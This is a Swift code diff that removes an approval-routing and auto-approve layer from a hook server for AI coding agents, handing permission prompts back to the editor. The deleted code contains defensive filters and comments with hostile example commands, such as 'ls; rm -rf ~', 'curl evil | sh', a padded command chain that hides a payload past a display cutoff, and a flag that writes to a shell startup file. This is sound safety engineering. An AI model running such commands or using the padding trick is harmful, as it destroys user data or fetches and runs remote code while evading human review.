@@ -328,74 +328,11 @@ func buildHookServer(
         return emptyOK()
     }
 
-    router.post("/hook/approve") { request, context -> Response in
+    router.post("/hook/approve") { request, _ -> Response in
         guard isAuthorized(request, token: config.token) else { return await rejectUnauthorized(request) }
         let source = request.uri.queryParameters["source"].map(String.init) ?? "claude-code"
-        // The script sends its own pid on every call. Arming the process
-        // watcher here — not just on SessionStart — is what clears the card
-        // instantly when the agent is force-quit mid-approval, even when Boop
-        // launched after the session began and never saw a SessionStart.
-        let hookPid = request.uri.queryParameters["pid"].flatMap { Int32(String($0)) }
-        let rawBuffer = try await request.body.collect(upTo: 1_048_576)
-        let body = try sharedDecoder.decode(HookEventBody.self, from: rawBuffer)
-        let sessionId = deriveSessionId(from: body, source: source)
-        let tool = body.effectiveToolName ?? "Unknown"
-        // Classify the actual operation, never its authored description.
-        let fullHint = approvalOperation(from: body)
-        let hint = extractHint(from: body)
-        let sessionLabel = cwdLabel(body.cwd)
-        let requestId = makeRequestId(sessionId: sessionId)
-
-        guard await engine.acceptsBuddyApprovals(source: source) else {
-            return approvalResponse(decision: .passthrough, source: source)
-        }
-
-        await diagLog.log(category: "approve", source: source, event: body.effectiveEventName ?? "approve", detail: tool)
-
-        await engine.ingest(RawHookPayload(source: source, sessionId: sessionId, kind: .sessionStart, toolName: "", cwd: body.effectiveCwd, timestamp: 0), hookPid: hookPid)
-
-        // A stale hook must not claim native approvals when the owner has not opted in.
-        guard await engine.acceptsBuddyApprovals(source: source) else {
-            return approvalResponse(decision: .passthrough, source: source)
-        }
-
-        // The safety check reads the FULL command; `hint` is display-truncated.
-        if let autoDecision = shouldAutoApprove(tool: tool, command: fullHint, source: source) {
-            await diagLog.log(category: "approve", source: source, event: "auto-\(autoDecision.rawValue)", detail: tool)
-            await engine.activitySignal(sessionId: sessionId, source: source, signal: .keepWorking, tool: tool, hint: hint)
-            return approvalResponse(decision: autoDecision, source: source)
-        }
-
-        // The blocked hook holds this connection open for as long as it wants
-        // the answer. If it closes early — agent killed, curl gave up, or the
-        // agent's own hook timeout fired and it fell back to its native
-        // prompt — the card must come down: the user would otherwise "approve"
-        // into a closed socket while the terminal shows the real prompt.
-        let channel = context.channel
-        let disconnectWatcher = Task {
-            try? await channel.closeFuture.get()
-            await engine.abandonApproval(sessionId: sessionId, requestId: requestId)
-        }
-        let (stakes, fallbackGloss) = StakesReader.read(tool: tool, input: fullHint)
-        let gloss = approvalGloss(from: body, fallback: fallbackGloss)
-        let decision = await engine.submitApproval(
-            sessionId: sessionId,
-            requestId: requestId,
-            tool: tool,
-            hint: hint,
-            sessionLabel: sessionLabel,
-            source: source,
-            stakes: stakes,
-            gloss: gloss
-        )
-        // cancel() can't interrupt closeFuture.get(); when the connection
-        // eventually closes after a normal decision, the late abandon is a
-        // guarded no-op (the prompt id no longer matches anything).
-        disconnectWatcher.cancel()
-
-        return approvalResponse(decision: decision, source: source)
+        return approvalResponse(decision: .passthrough, source: source)
     }
-
 
     return Application(
         router: router,
@@ -421,6 +358,7 @@ func handleAgentEvent(
 ) async {
     let sessionId = deriveSessionId(from: body, source: source)
     let event = body.effectiveEventName ?? ""
+    guard event != "PermissionRequest" else { return }
     let sessionLabel = cwdLabel(body.cwd)
 
     if event != "SessionEnd" {
@@ -449,23 +387,13 @@ func handleAgentEvent(
     case "SessionEnd":
         await engine.sessionEnded(sessionId: sessionId)
 
-    case "PermissionRequest":
-        let tool = body.effectiveToolName ?? "Permission"
-        let hint = extractHint(from: body)
-        let requestId = makeRequestId(sessionId: sessionId)
-        await engine.submitRequest(sessionId: sessionId, requestId: requestId, tool: tool, hint: hint, sessionLabel: sessionLabel)
+    case "PermissionRequest": break // Retired; the editor owns permission requests.
 
     case "Notification":
         switch body.notification_type {
         case "permission_prompt":
-            // Intentionally ignored: PermissionRequest is authoritative for
-            // permission cards in both modes (it routes to /hook/approve when
-            // approval mode is on, and shows a passive card via /hook/event when
-            // off), and its payload carries the tool + command. The
-            // permission_prompt notification only duplicates that with a poorer
-            // label ("permission_prompt" / a generic message), so we no longer
-            // register or handle it. Left as an explicit no-op in case an older
-            // or hand-edited config still emits it.
+            // Native approval notifications are not a reliable owned request.
+            // Ignore stale registrations without inventing an attention card.
             break
         case "elicitation_dialog":
             let requestId = makeRequestId(sessionId: sessionId)
@@ -502,102 +430,9 @@ func approvalGloss(from body: HookEventBody, fallback: String) -> String {
     return description.prefix(utf8Bytes: 200)
 }
 
+/// Compatibility for old hook scripts. Boop never returns allow or deny.
 func approvalResponse(decision: ApprovalDecision, source: String) -> Response {
-    if decision == .passthrough {
-        if source == "cursor" {
-            return jsonResponse(["permission": "ask"])
-        }
-        return emptyOK()
-    }
-
-    let payload: [String: Any]
-    if source == "cursor" {
-        switch decision {
-        case .allow:
-            payload = ["permission": "allow"]
-        case .deny:
-            payload = ["permission": "deny", "user_message": "Denied by Boop", "agent_message": "Tool call denied by Boop approval mode."]
-        case .passthrough:
-            payload = ["permission": "ask"]
-        }
-    } else {
-        var decisionDict: [String: Any] = ["behavior": decision.rawValue]
-        if decision == .deny {
-            decisionDict["message"] = "Denied by Boop"
-        }
-        payload = [
-            "hookSpecificOutput": [
-                "hookEventName": "PermissionRequest",
-                "decision": decisionDict,
-            ] as [String: Any],
-        ]
-    }
-    guard let data = try? JSONSerialization.data(withJSONObject: payload) else {
-        return Response(status: .internalServerError)
-    }
-    return Response(
-        status: .ok,
-        headers: [.contentType: "application/json"],
-        body: .init(byteBuffer: ByteBuffer(data: data))
-    )
-}
-
-private let cursorAutoApproveTools: Set<String> = ["Read", "Glob", "Grep", "LSP", "WebFetch"]
-
-// `find` and `fd` are deliberately absent: both spawn processes and delete
-// files through their own arguments (`find . -delete`, `fd -x rm {}`) without
-// needing a single shell metacharacter, so no amount of separator filtering
-// makes them safe to approve unseen.
-private let cursorSafeShellPatterns: [String] = [
-    #"^(ls|cat|head|tail|wc|grep|rg|which|echo|pwd|date|whoami|hostname|uname)\b"#,
-    #"^git (status|log|diff|show|branch|remote|tag)\b"#,
-]
-
-// Shell control operators that let a "safe" command prefix smuggle a second,
-// dangerous command (e.g. `ls; rm -rf ~`, `cat x && curl evil | sh`, `git log > f`).
-// If any appear, the command is NOT eligible for auto-approval — it must be
-// reviewed manually.
-private let shellControlCharacters: CharacterSet = {
-    var set = CharacterSet(charactersIn: ";&|`$()<>")
-    // CLAUDE.md requires manual review for control characters. Naming only
-    // \n and \r let ESC, NUL and the rest of C0 through — an escape sequence
-    // reaches the log and the UI, and a NUL truncates the command for any
-    // downstream C consumer while the shell still runs the whole thing.
-    set.formUnion(.controlCharacters)
-    return set
-}()
-
-// Flags that turn an otherwise read-only command into an exec or a write.
-// Checked separately from the allowlist because the allowlist matches the
-// command NAME, and these all live in the arguments.
-private let dangerousArgumentPatterns: [String] = [
-    #"(?:^|\s)--pre(?:=|\s|$)"#,        // rg --pre runs a preprocessor per file
-    #"(?:^|\s)--pre-glob\b"#,
-    #"(?:^|\s)--hostname-bin\b"#,       // rg runs this binary
-    #"(?:^|\s)--output(?:=|\s|$)"#,     // git diff --output=~/.zshenv
-    #"(?:^|\s)-(?:exec|execdir|ok|okdir|delete|fprint|fprintf|fls)\b"#,
-]
-
-/// Whether Cursor may run this command without showing the user a card.
-///
-/// `command` MUST be the full, untruncated command. It used to be the same
-/// 200-character string the UI displays, which meant a chain hidden past the
-/// cutoff (`ls <200 chars of padding>; curl evil.sh | sh`) was scanned as a
-/// bare `ls` and auto-approved — the separator was never in the string being
-/// checked. Display truncation and safety analysis must not share an input.
-func shouldAutoApprove(tool: String, command: String, source: String) -> ApprovalDecision? {
-    guard source == "cursor" else { return nil }
-    if cursorAutoApproveTools.contains(tool) { return .allow }
-    if command.rangeOfCharacter(from: shellControlCharacters) != nil { return nil }
-    for pattern in dangerousArgumentPatterns {
-        if command.range(of: pattern, options: .regularExpression) != nil { return nil }
-    }
-    for pattern in cursorSafeShellPatterns {
-        if command.range(of: pattern, options: .regularExpression) != nil {
-            return .allow
-        }
-    }
-    return nil
+    source == "cursor" ? jsonResponse(["permission": "ask"]) : emptyOK()
 }
 
 // MARK: - Helpers
